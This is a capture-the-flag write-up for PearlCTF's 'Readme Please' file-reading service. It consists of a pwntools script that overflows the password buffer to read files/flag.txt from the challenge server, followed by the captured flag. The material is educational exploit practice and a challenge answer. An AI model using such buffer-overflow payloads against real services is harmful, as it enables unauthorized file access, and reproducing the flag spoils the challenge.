# Readme Please

>I made a very secure file reading service.

https://pearlctf.in/files/readme_src.zip

nc readme-please.ctf.pearlctf.in 30039


## solve
```
from pwn import *

elf = ELF("./main", checksec=False)
context.binary = elf

p = remote("readme-please.ctf.pearlctf.in", 30039)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A" * ((0x108 - 0x98) + 1)
p.sendlineafter(b"Enter password: ", payload)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A"
p.sendlineafter(b"Enter password: ", payload)

print(p.readuntil(b"}").decode())
```

## flag
`pearl{f1l3_d3script0rs_4r3_c00l}`